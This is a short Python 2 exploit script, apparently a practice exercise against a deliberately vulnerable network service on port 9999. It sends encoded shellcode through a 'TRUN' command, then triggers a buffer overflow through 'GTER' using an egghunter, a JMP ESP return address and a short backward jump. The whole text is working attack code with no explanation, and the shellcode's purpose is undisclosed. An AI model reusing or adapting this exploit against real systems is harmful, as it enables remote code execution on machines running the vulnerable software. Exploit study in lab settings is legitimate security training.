import socket as so
import struct, os, time

os.system("clear")

egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
"\x05\x5a\x74\xef\xb8\x4e\x45\x50\x45\x8b\xfa\xaf\x75"
"\xea\xaf\x75\xe7\xff\xe7"
)
tag = "NEPENEPE"

buffer="A"*(151-(50+len(egghunter)))
eip = struct.pack("<L",0x625011C7) # JMP ESP
jumesp = "\xEB\x86" #JMP SHORT -120 
shellcode = tag
shellcode += "\x89\xfb\xba\xc9\xb0\x98\x92\x33\xc9\xb1\x53\x83\xc3"
shellcode += "\x04\x31\x53\x0e\x03\x9a\xbe\x7a\x67\xe0\x57\xf8\x88"
shellcode += "\x18\xa8\x9d\x01\xfd\x99\x9d\x76\x76\x89\x2d\xfc\xda"
shellcode += "\x26\xc5\x50\xce\xbd\xab\x7c\xe1\x76\x01\x5b\xcc\x87"
shellcode += "\x3a\x9f\x4f\x04\x41\xcc\xaf\x35\x8a\x01\xae\x72\xf7"
shellcode += "\xe8\xe2\x2b\x73\x5e\x12\x5f\xc9\x63\x99\x13\xdf\xe3"
shellcode += "\x7e\xe3\xde\xc2\xd1\x7f\xb9\xc4\xd0\xac\xb1\x4c\xca"
shellcode += "\xb1\xfc\x07\x61\x01\x8a\x99\xa3\x5b\x73\x35\x8a\x53"
shellcode += "\x86\x47\xcb\x54\x79\x32\x25\xa7\x04\x45\xf2\xd5\xd2"
shellcode += "\xc0\xe0\x7e\x90\x73\xcc\x7f\x75\xe5\x87\x8c\x32\x61"
shellcode += "\xcf\x90\xc5\xa6\x64\xac\x4e\x49\xaa\x24\x14\x6e\x6e"
shellcode += "\x6c\xce\x0f\x37\xc8\xa1\x30\x27\xb3\x1e\x95\x2c\x5e"
shellcode += "\x4a\xa4\x6f\x37\xbf\x85\x8f\xc7\xd7\x9e\xfc\xf5\x78"
shellcode += "\x35\x6a\xb6\xf1\x93\x6d\xb9\x2b\x63\xe1\x44\xd4\x94"
shellcode += "\x28\x83\x80\xc4\x42\x22\xa9\x8e\x92\xcb\x7c\x3a\x9a"
shellcode += "\x6a\x2f\x59\x67\xcc\x9f\xdd\xc7\xa5\xf5\xd1\x38\xd5"
shellcode += "\xf5\x3b\x51\x7e\x08\xc4\x4c\x23\x85\x22\x04\xcb\xc3"
shellcode += "\xfd\xb0\x29\x30\x36\x27\x51\x12\x6e\xcf\x1a\x74\xa9"
shellcode += "\xf0\x9a\x52\x9d\x66\x11\xb1\x19\x97\x26\x9c\x09\xc0"
shellcode += "\xb1\x6a\xd8\xa3\x20\x6a\xf1\x53\xc0\xf9\x9e\xa3\x8f"
shellcode += "\xe1\x08\xf4\xd8\xd4\x40\x90\xf4\x4f\xfb\x86\x04\x09"
shellcode += "\xc4\x02\xd3\xea\xcb\x8b\x96\x57\xe8\x9b\x6e\x57\xb4"
shellcode += "\xcf\x3e\x0e\x62\xb9\xf8\xf8\xc4\x13\x53\x56\x8f\xf3"
shellcode += "\x22\x94\x10\x85\x2a\xf1\xe6\x69\x9a\xac\xbe\x96\x13"
shellcode += "\x39\x37\xef\x49\xd9\xb8\x3a\xca\xe9\xf2\x66\x7b\x62"
shellcode += "\x5b\xf3\x39\xef\x5c\x2e\x7d\x16\xdf\xda\xfe\xed\xff"
shellcode += "\xaf\xfb\xaa\x47\x5c\x76\xa2\x2d\x62\x25\xc3\x67"

payload = "B"*50+egghunter+buffer+eip+jumesp

print "Send Exploit TRUN..."
s=so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect(("169.254.193.236", 9999))
s.send("TRUN "+shellcode)
s.recv(1024)
s.close()
time.sleep(1)

print "Send Exploit GTER..."
s=so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect(("169.254.193.236", 9999))
s.send("GTER "+payload)
s.recv(1024)
s.close()
time.sleep(1)

print "Exploit Finalizado...\n"